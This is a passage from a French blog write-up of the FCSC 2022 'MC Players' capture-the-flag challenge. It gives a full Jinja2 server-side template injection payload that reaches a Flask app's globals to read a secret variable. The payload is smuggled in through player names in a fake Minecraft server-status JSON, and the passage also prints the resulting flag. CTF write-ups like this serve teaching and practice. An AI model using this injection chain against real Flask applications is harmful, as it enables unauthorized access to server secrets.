<p>Il nous reste un dernier problème, avec <strong>globals</strong> par exemple, nous n&rsquo;avons pas assez de place, même avec la payload la plus courte possible pour le mettre. Mais nous avons la chance que <code>url_for.__globals__</code> soit similaire à <code>url_for['__globals__']</code>. Et ceci va nous permettre de placer <strong>globals</strong> en string et nous pas en brute ce qui est était impossible pour nous. Voici donc la chaîne complète de la payload trouvée et exploitée grâce aux variables flask :</p>
<pre tabindex="0"><code>{%set b=url_for%}  
{%set c=&#34;globals&#34;%} 
{%set d=&#34;__&#34;%}       
{%set e=b[d~c~d]%}  // url_for.__globals__

{%set f=&#34;current&#34;%}   
{%set g=f~&#34;_app&#34;%}  //  current_app

{%set h=&#34;view_fun&#34;%}
{%set i=h~&#34;ctions&#34;%} // view_functions

{%set j=&#34;flag&#34;%}

{%set k=e[g][i][j]%} 
{%set l=k[d~c~d]%} // url_for.__globals__.current_app.view_functions.flag

{{l.FLAG}} 
</code></pre><p>On crée donc un petit script qui va nous créer notre JSON avec chaque nom de joueurs correspondants, puis on place notre payload sur notre serveur. (Note : Les doubles quotes sont interdites dans le json renvoyé à mcstatus, on passe donc par des simples quotes. Un problème était présent au niveau de la longueur car notre payload était bien supérieure en longueur à notre première injection. Au niveau de l&rsquo;entête avant le JSON, les données n&rsquo;étaient pas bonnes, j&rsquo;ai donc changé la description de mon serveur minecraft de test, afin de correspondre à la longueur de ma payload, pour regarder quelles données d&rsquo;entêtes étaient envoyées. Il se trouve que le protocole à l&rsquo;air de fonctionner avec des cycles de 0x00 à 0xff et des compteurs)</p>
<p>Voici donc notre json final :</p>
<pre tabindex="0"><code>data = b&#39;&#39;&#39;{&#34;description&#34;:{&#34;text&#34;:&#34;&#34;},&#34;players&#34;:{&#34;max&#34;:2,&#34;online&#34;:1,&#34;sample&#34;:[{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set b=url_for%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set c=&#39;globals&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set d=&#39;__&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set e=b[d~c~d]%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set f=&#39;current&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set g=f~&#39;_app&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set h=&#39;view_fun&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set i=h~&#39;ctions&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set j=&#39;flag&#39;%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set k=e[g][i][j]%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{%set l=k[d~c~d]%}&#34;},{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{{l.FLAG}}&#34;}]},&#34;version&#34;:{&#34;name&#34;:&#34;1.18.2&#34;,&#34;protocol&#34;:758}}&#39;&#39;&#39;
</code></pre><p>On écoute sur notre serveur, on spécifie l&rsquo;ip sur le challenge, et on récupère notre FLAG :)</p>
<p><img src="/img/mc-players/4.png" alt=""></p>
<p>FLAG : <code>FCSC{4141f870d98724a3c32b138888e72c5de4e3c793fe1410e1e269d551ae3b3b0f}</code></p>
<p>Merci à l&rsquo;auteur pour ce super challenge qui mellait analyse protocole réseau pour ma part et SSTI originale.</p>
<h2 id="liens-utiles">Liens utiles</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
<li><a href="https://github.com/itzg/docker-minecraft-server">https://github.com/itzg/docker-minecraft-server</a></li>
<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti</a></li>
<li><a href="http://www.andynoel.xyz/?p=244">http://www.andynoel.xyz/?p=244</a></li>
<li><a href="https://ctftime.org/writeup/11014">https://ctftime.org/writeup/11014</a></li>
</ul>

    </div>
  </article>

  
  





  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories">Categories</a></li>
         
          <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#énoncé">Énoncé</a></li>
    <li><a href="#résolution">Résolution</a>
      <ul>
        <li><a href="#serveur-minecraft">Serveur Minecraft</a></li>
        <li><a href="#ssti---lire-le-flag">SSTI - Lire le FLAG</a></li>
      </ul>
    </li>
    <li><a href="#liens-utiles">Liens utiles</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&text=FCSC2022%20-%20MC%20Players" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&title=FCSC2022%20-%20MC%20Players" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&is_video=false&description=FCSC2022%20-%20MC%20Players" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=FCSC2022%20-%20MC%20Players&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&title=FCSC2022%20-%20MC%20Players" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&title=FCSC2022%20-%20MC%20Players" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&name=FCSC2022%20-%20MC%20Players&description=FCSC%202022%20-%20MC%20Players%20-%20Write-up%20%c3%89nonc%c3%a9%20Cela%20fait%20plusieurs%20mois%20que%20le%20service%20de%20Dinnerbone%20permettant%20de%20r%c3%a9cup%c3%a9rer%0ale%20statut%20d%26rsquo%3bun%20serveur%20Minecraft%20n%26rsquo%3best%20plus%20actif.%20Nous%20avons%20donc%20d%c3%a9cid%c3%a9%20de%20proposer%20une%20alternative%20r%c3%a9utilisant%20sa%20librairie%20mcstatus.%0ahttps%3a%2f%2fmc-players.france-cybersecurity-challenge.fr%2f%0aR%c3%a9solution%20Ici%20on%20se%20retrouve%20face%20%c3%a0%20une%20appli%20web%20en%20white-box%2c%20c%e2%80%99est-%c3%a0-dire%20que%20nous%20avons%20le%20code%20source%20de%20l%e2%80%99application%20%c3%a0%20notre%20disposition.%20Cette%20application%20est%20d%c3%a9velopp%c3%a9e%20en%20python%20avec%20le%20framework%20flask." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&t=FCSC2022%20-%20MC%20Players" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  Itarow 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>



</html>
